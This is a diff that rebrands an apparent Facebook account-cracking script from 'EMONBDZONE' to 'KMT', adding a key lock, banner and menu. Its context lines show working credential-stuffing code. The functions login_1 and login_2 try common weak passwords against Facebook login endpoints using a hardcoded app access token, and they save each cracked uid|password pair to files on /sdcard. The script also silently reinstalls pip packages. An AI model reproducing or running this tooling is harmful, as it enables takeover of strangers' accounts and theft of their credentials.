@@ -15,15 +15,15 @@ from concurrent.futures import ThreadPoolExecutor as tred
 from os import system
 from datetime import datetime
 
-import os, sys
+import os, sys, time
 
 # Valid keys
-approved_keys = ["kyawmintun"]
+approved_keys = ["KMT"]
 
 def first_step():
     os.system("clear")
     print("────────────────────────────────────")
-    print("     🔐 Script Locked 🔐")
+    print("        🔐 KMT SYSTEM 🔐")
     print("────────────────────────────────────\n")
 
     input("\n[↩] Press Enter to continue...")
@@ -36,10 +36,56 @@ def check_key():
         print("\n[×] Invalid key!")
         sys.exit()
 
+# Start
 first_step()
 check_key()
 
-print(">>> Tool Successfully Unlocked <<<")
+print(">>> KMT TOOL SUCCESSFULLY UNLOCKED <<<")
+
+
+# ------------------ Banner ------------------
+
+def banner():
+    os.system("clear")
+    print("""
+\033[1;32m
+██╗  ██╗███╗   ███╗████████╗
+██║ ██╔╝████╗ ████║╚══██╔══╝
+█████╔╝ ██╔████╔██║   ██║   
+██╔═██╗ ██║╚██╔╝██║   ██║   
+██║  ██╗██║ ╚═╝ ██║   ██║   
+╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   
+
+        K Y A W  M I N  T U N
+        >>>  K M T SYSTEM  <<<
+
+\033[0m
+""")
+
+# ------------------ Menu ------------------
+
+def main_menu():
+    banner()
+    print("[1] Start Tool")
+    print("[0] Exit")
+    print("────────────────────────")
+
+    choice = input("Choose : ")
+
+    if choice == "1":
+        print("\n[✓] Tool Started (KMT Coder)")
+        time.sleep(2)
+    elif choice == "0":
+        print("\n[✓] Exit")
+        sys.exit()
+    else:
+        print("\n[×] Invalid choice")
+        time.sleep(1)
+        main_menu()
+
+# Run menu
+if __name__ == "__main__":
+    main_menu()
 
 
 
@@ -59,13 +105,14 @@ requests.urllib3.disable_warnings()
 
 # Initial setup and promotion
 os.system('clear')
-print(' \x1b[38;5;46m EMONBDZONE SERVER LOADING....')
+print(' \x1b[38;5;46m Kyaw Min Tun SERVER LOADING....')
 
 
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 os.system('pip install httpx pip install beautifulsoup4')
 print('loading Modules ...\n')
 os.system('clear')
+
 
 # --- Anti-tampering and Security Checks ---
 # The script checks if the source code of the 'requests' library has been modified
@@ -176,7 +223,7 @@ def window1():
 sys.stdout.write('\x1b]2;𓆩【EMONBDZONE】𓆪 \x07')
 
 
-    # Kyaw Min Tun Logo - Speed - Version 2.5
+    # EMON Logo - Speed - Version 2.5
 def ____banner____():
     if 'win' in sys.platform:
         os.system('cls')
@@ -185,23 +232,18 @@ def ____banner____():
     
     print("""\033[1;32m
         
-# Banner (KMT Style)
-print_banner() {
-clear
-echo -e "${bold_green}"
-echo -e "██╗  ██╗███╗   ███╗████████╗"
-echo -e "██║ ██╔╝████╗ ████║╚══██╔══╝"
-echo -e "█████╔╝ ██╔████╔██║   ██║   "
-echo -e "██╔═██╗ ██║╚██╔╝██║   ██║   "
-echo -e "██║  ██╗██║ ╚═╝ ██║   ██║   "
-echo -e "╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   "
-echo -e "${nc}"
-echo -e "${bold}        K Y A W  M I N  T U N${nc}"
-echo -e "${bold_green}        >>>  K M T  SYSTEM  <<<${nc}"
-echo
-}
-
-print_banner
+                  (\  (\
+ („• ֊ •„)   Assalamualaikum. . . 💌
+ ━O━O━━━━━━━━━━━━━━━━━━━━━━━
+[Name]'s Intro! 🐇 💨 
+┊🌺 Name : EMON
+┊🌼 Age : 23
+┊🌻 Pronouns/Gender : Male
+┊🥕 Hobbies : HACKING
+      Made By Bangladesh 
+============================
+                TOOL BY EMONBDZONE 
+\033[0m""")
 
 
 def creationyear(uid):
@@ -426,7 +468,7 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mEMON OK ID-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKMT OK ID-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
@@ -472,12 +514,12 @@ def login_1(uid):
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
                 print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mEMON\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/EMON-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                open('/sdcard/KMT-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
-                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mEMON BABA\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                open('/sdcard/EMON-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKMT\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                open('/sdcard/KMT-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
         loop += 1
@@ -488,8 +530,8 @@ def login_1(uid):
 def login_2(uid):
     """
     Login attempt method 2.
-    ""
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mEMON-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
+    """
+    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mKMT-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
     
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         try:
@@ -507,13 +549,13 @@ def login_2(uid):
                 url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                 po = session.get(url, headers=headers).json()
                 if 'session_key' in str(po):
-                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mEMON XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/EMON-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mKMT XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
+                    open('/sdcard/KMT-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
                 elif 'session_key' in po:
                     print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mAHB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-                    open('/sdcard/EMON-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                    open('/sdcard/KMT-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                     oks.append(uid)
                     break
         except Exception as e:
